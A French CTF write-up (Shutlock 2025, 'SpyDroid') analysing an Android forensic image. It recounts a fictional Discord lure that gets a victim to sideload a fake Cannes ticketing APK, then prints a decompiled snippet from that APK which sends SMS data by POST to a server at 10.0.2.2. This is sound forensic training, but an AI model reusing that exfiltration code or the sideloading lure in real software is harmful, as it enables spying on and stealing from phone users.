@@ -1,0 +1,216 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="fr" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SpyDroid &mdash; Documentation Kubow WU 1</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=80d5e7a1" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=9edc463e" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=a12a2fe1"></script>
+      <script src="../../_static/doctools.js?v=fd6eb6e6"></script>
+      <script src="../../_static/sphinx_highlight.js?v=6ffebe34"></script>
+      <script src="../../_static/translations.js?v=e6b791cb"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Recherche" href="../../search.html" />
+    <link rel="prev" title="IOS Backup" href="iosbackup.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            Kubow WU
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Rechercher docs" aria-label="Rechercher docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Liste des CTFs :</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2024/_index.html">Midnight Flag 2024</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2025/_index.html">Midnight Flag 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../404ctf-2024/_index.html">404CTF 2024</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../404ctf-2025/_index.html">404CTF 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../404ctf-2026/_index.html">404CTF 2026</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../HTB-Apocalypse-2025/_index.html">HTB Apocalypse 2024</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../FCSC-2025/_index.html">FCSC 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../DGSE-Root-Me-2025/_index.html">DGSE Root-Me 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Hackosint-2025/_index.html">Hackosint 2025</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="_index.html">Shutlock 2025</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="_index.html#story">Story</a></li>
+<li class="toctree-l2"><a class="reference internal" href="_index.html#web">Web</a></li>
+<li class="toctree-l2"><a class="reference internal" href="_index.html#osint">Osint</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="_index.html#forensic">Forensic</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="iosbackup.html">IOS Backup</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">SpyDroid</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Kubow WU</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="_index.html">Shutlock 2025</a></li>
+      <li class="breadcrumb-item active">SpyDroid</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/ctf/shutlock-2025/spydroid.rst.txt" rel="nofollow"> Afficher la source de la page</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="spydroid">
+<h1>SpyDroid<a class="headerlink" href="#spydroid" title="Lien vers cette rubrique"></a></h1>
+<p>On va utiliser ALEAPP (<a class="reference external" href="https://github.com/abrignoni/ALEAPP">https://github.com/abrignoni/ALEAPP</a>) et regarder les informations a notre disposition :</p>
+<p>On trouve d’abord l’email de la victime : <a class="reference external" href="mailto:lauracinema958&#37;&#52;&#48;gmail&#46;com">lauracinema958<span>&#64;</span>gmail<span>&#46;</span>com</a>,</p>
+<p>Historique de conversation Discord :</p>
+<p>pierrebzh_92574 :
+Bon… je commence à perdre patience. Trois jours que j’essaie de réserver des billets à l’ouverture, et trois jours que le site plante. Ce matin j’ai même pas vu la file d’attente, juste un « erreur 503 ».</p>
+<p>laura_cinema :
+Même chose. J’étais prête à 8h55 avec mon café, tout bien calé… Résultat : chargement infini, puis plus rien. J’ai actualisé 15 fois, et puis j’ai abandonné.</p>
+<p><a href="#id1"><span class="problematic" id="id2">ludotech_</span></a> :
+On dirait que rien n’a changé depuis l’année dernière. Leur plateforme est toujours aussi fragile. C’est incompréhensible qu’un évènement comme Cannes ait un système aussi peu fiable</p>
+<p>pierrebzh_92574 :
+Et le pire, c’est qu’on sait d’avance que ce sera pareil l’an prochain. Ils doivent se dire que les gens viendront quand même, alors pourquoi se fatiguer…</p>
+<p>laura_cinema :
+En attendant, nous on peut pas réserver un seul film. C’est épuisant. Tu prépares ton programme pendant des semaines pour rien.</p>
+<p><a href="#id3"><span class="problematic" id="id4">ludotech_</span></a> :
+Bon. J’vous lis galérer depuis ce matin et j’me dis que c’est peut-être le moment de partager un truc que j’ai trouvé. C’est pas officiel, donc à prendre avec des pincettes. Mais j’ai testé, et pour moi ça marche.</p>
+<p>pierrebzh_92574 :
+h, voilà… le moment où Ludo sort sa botte secrète. J’espère que c’est pas encore un fichier zip trouvé sur un chan Telegram douteux.</p>
+<p><a href="#id5"><span class="problematic" id="id6">ludotech_</span></a> :
+Haha non, rien d’illégal, t’inquiète. C’est une appli Android — une APK, donc — qu’un gars a développée et partagée sur un forum. Le mec est français apparemment. Il a codé un truc pour centraliser les séances du Festival. Et il y a même une option de « réservation directe » dessus.</p>
+<p>laura_cinema :
+Tu veux dire qu’on peut réserver via cette appli ? Parce que si c’est vrai, je la prends direct. Le site officiel me rend folle.</p>
+<p><a href="#id7"><span class="problematic" id="id8">ludotech_</span></a> :
+C’est ce que j’ai compris ouais. Moi je suis pas à Cannes donc j’ai pas pu tester la résa, mais tout le reste est fonctionnel. Tu peux filtrer par jour, voir les films, les horaires, les lieux, tout ça. L’interface est propre, sombre, sans pubs, et ça rame pas.</p>
+<p>pierrebzh_92574 :
+Tu l’as trouvée où exactement ton appli ? Et pourquoi elle est pas sur le Play Store si elle est si bien que ça ?</p>
+<p><a href="#id9"><span class="problematic" id="id10">ludotech_</span></a> :
+L’auteur disait qu’il voulait pas la publier publiquement pour éviter que trop de monde s’en serve. Il l’a balancée sur un forum fermé, et c’est un autre membre qui a partagé le lien. Je l’ai téléchargée, installée, et franchement… rien à signaler</p>
+<p>laura_cinema :
+lle demande quoi comme autorisations ? Parce que j’ai pas envie de finir avec un spyware.</p>
+<p><a href="#id11"><span class="problematic" id="id12">ludotech_</span></a> :
+Juste les photos + SMS. Rien d’extraordinaire pour une appli de ce type. Pas d’inscription, pas de compte à créer, pas de redirection suspecte.</p>
+<p>pierrebzh_92574 :
+Bon moi j’passe. Rien que « APK sur un forum », ça me refroidit. J’ai pas envie de voir ma galerie de photos sur Twitter.</p>
+<p>laura_cinema :
+Bah écoute… Franchement je suis à bout. J’en ai marre de tourner en rond avec le site officiel. Si y’a une chance que je puisse réserver autrement, je tente. C’est pas comme si j’avais mille solutions de toute façon.</p>
+<p><a href="#id13"><span class="problematic" id="id14">ludotech_</span></a> :
+Ok, je t’envoie l’appli : Nom du fichier : <strong>CannesBilletterie.apk</strong> Tu me diras ce que t’en penses.</p>
+<p>laura_cinema :
+Je télécharge…
+Téléchargement terminé. Je lance l’installation. Bon… faut activer « sources inconnues », je sais, c’est pas l’idéal, mais tant pis.</p>
+<p>pierrebzh_92574 :
+Tu fais comme tu veux hein… mais garde-nous au courant si l’appli te demande soudain ton code bancaire 😅</p>
+<p>laura_cinema :
+C’est bon, installée. J’ouvre l’appli.</p>
+<p>Bon on a déja pas mal d’info sur ce qu’il s’est passé.</p>
+<p>On trouve aussi cet email :
+Bonjour Laura,</p>
+<p>Nous avons le plaisir de vous annoncer le lancement d’un nouveau concours qui mettra vos talents d’analyse et vos compétences techniques à l’épreuve !</p>
+<p>🎯 Objectif :
+Identifier et reconstruire un code cadeau caché à partir d’une situation simulée de compromission. Le premier à soumettre le bon format remportera une récompense exclusive !</p>
+<p>🧩 Format du code :
+Le code cadeau est à reconstituer sous le format suivant :</p>
+<p>SHUTLOCK{nom_appli/pseudo_de_l’attaquant/jour_infection/IP_Destination}</p>
+<p>Exemple :
+SHUTLOCK{com.example.webmail/rootkit42/12-04-2025/192.168.1.15}</p>
+<p>Envoyé avec la messagerie sécurisée Proton Mail.</p>
+<p>On a priori un format flag ? SHUTLOCK{nom_appli/pseudo_de_l’attaquant/jour_infection/IP_Destination}</p>
+<p>On a déjà le nom de l’application, que l’on retrouve dans data/data/fr.shutlock.billetterievipcannes</p>
+<p>Le pseudo de l’attaquant <strong>ludotech_</strong></p>
+<p>La date avec le jour des messages : <strong>15-04-2025</strong></p>
+<p>Il ne manque que l’IP.</p>
+<p>On envoie l’apk sur mobsf.live, on attend l’analyse</p>
+<p>Et on regarde la liste de connexions, ou bien directement dans le code de l’app :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">        public Void doInBackground(String... params) {</span>
+<span class="go">        String imagePath = params[0];</span>
+<span class="go">        try {</span>
+<span class="go">            URL url = new URL(&quot;http://10.0.2.2:17878/&quot;);</span>
+<span class="go">            HttpURLConnection connection = (HttpURLConnection) url.openConnection();</span>
+<span class="go">            connection.setDoOutput(true);</span>
+<span class="go">            connection.setRequestMethod(&quot;POST&quot;);</span>
+<span class="go">            connection.setRequestProperty(&quot;Content-Type&quot;, &quot;application/octet-stream&quot;);</span>
+<span class="go">            OutputStream os = connection.getOutputStream();</span>
+<span class="go">            byte[] buffer = imagePath.getBytes();</span>
+<span class="go">            os.write(buffer);</span>
+<span class="go">            os.flush();</span>
+<span class="go">            os.close();</span>
+<span class="go">            Log.w(&quot;TAG&quot;, &quot;SMS sent to server: &quot; + imagePath);</span>
+<span class="go">            return null;</span>
+<span class="go">        } catch (IOException e) {</span>
+<span class="go">            e.printStackTrace();</span>
+<span class="go">            return null;</span>
+<span class="go">        }</span>
+<span class="go">    }</span>
+<span class="go">}</span>
+</pre></div>
+</div>
+<p>On retrouve alors notre IP : <strong>10.0.2.2</strong></p>
+<p>On a donc notre flag : <strong>SHLK{fr.shutlock.billetterievipcannes/ludotech_/15-04-2025/10.0.2.2}</strong></p>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Pied de page">
+        <a href="iosbackup.html" class="btn btn-neutral float-left" title="IOS Backup" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Précédent</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Droits d'auteur 2025, Kubow.</p>
+  </div>
+
+  Compilé avec <a href="https://www.sphinx-doc.org/">Sphinx</a> en utilisant un
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">thème</a>
+    fourni par <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
